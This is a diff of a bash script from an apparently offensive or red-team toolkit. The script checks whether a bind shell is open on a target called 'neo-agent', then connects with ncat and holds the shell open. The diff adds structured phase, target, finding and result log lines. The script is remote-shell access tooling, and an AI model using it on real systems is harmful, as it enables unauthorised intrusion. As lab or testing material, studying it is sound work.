@@ -21,26 +21,30 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/lib.sh"
 
 banner "Hold Shell Connection"
+echo "@PHASE Hold-Shell"
 
 AGENT_IP=$(resolve_agent_ip)
+echo "@TARGET $AGENT_IP neo-agent"
 echo "  Agent IP:   $AGENT_IP"
 echo "  Bind port:  $BIND_PORT"
 echo ""
 echo "  Checking if bind shell is open..."
 
 if ! ncat -z "$AGENT_IP" "$BIND_PORT" 2>/dev/null; then
+  echo "@RESULT failure Port $BIND_PORT is not open on $AGENT_IP"
   echo "  ERROR: Port $BIND_PORT is not open on $AGENT_IP."
   echo "  Run trigger.sh first, then wait-shell.sh."
   exit 1
 fi
 
+echo "@FINDING info Bind shell confirmed open on $AGENT_IP:$BIND_PORT"
 echo "  Port $BIND_PORT is open. Connecting... (Ctrl+C to disconnect)"
 echo ""
 
 sleep infinity | ncat "$AGENT_IP" "$BIND_PORT" &
 NCAT_PID=$!
 
-trap 'kill $NCAT_PID 2>/dev/null; echo ""; echo "  Disconnected."; exit 0' INT TERM
+trap 'kill $NCAT_PID 2>/dev/null; echo ""; echo "@RESULT success Shell held and disconnected"; echo "  Disconnected."; exit 0' INT TERM
 
 echo "  Connected. Shell is held open."
 echo "  Press Ctrl+C to disconnect."
